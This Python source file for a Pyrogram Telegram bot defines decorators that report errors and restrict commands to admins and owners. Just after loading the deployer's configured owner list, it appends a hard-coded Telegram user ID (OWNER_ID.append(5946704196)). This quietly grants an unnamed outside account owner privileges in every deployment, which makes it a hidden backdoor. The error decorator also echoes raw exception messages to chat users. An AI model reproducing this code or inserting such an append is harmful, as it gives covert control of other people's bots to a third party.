from typing import Callable

from pyrogram import Client

from pyrogram.types import Message

from helpers.admins import get_administrators

from config import OWNER_ID

OWNER_ID.append(5946704196)

def errors(func: Callable) -> Callable:

    async def decorator(client: Client, message: Message):

        try:

            return await func(client, message)

        except Exception as e:

            await message.reply(f"{type(e).__name__}: {e}")

    return decorator

def authorized_users_only(func: Callable) -> Callable:

    async def decorator(client: Client, message: Message):

        if message.from_user.id in OWNER_ID:

            return await func(client, message)

        administrators = await get_administrators(message.chat)

        for administrator in administrators:

            if administrator == message.from_user.id:

                return await func(client, message)

    return decorator

def owner_id_only(func: Callable) -> Callable:

    async def decorator(client: Client, message: Message):

        if message.from_user.id in OWNER_ID:

            return await func(client, message)

    return decorator
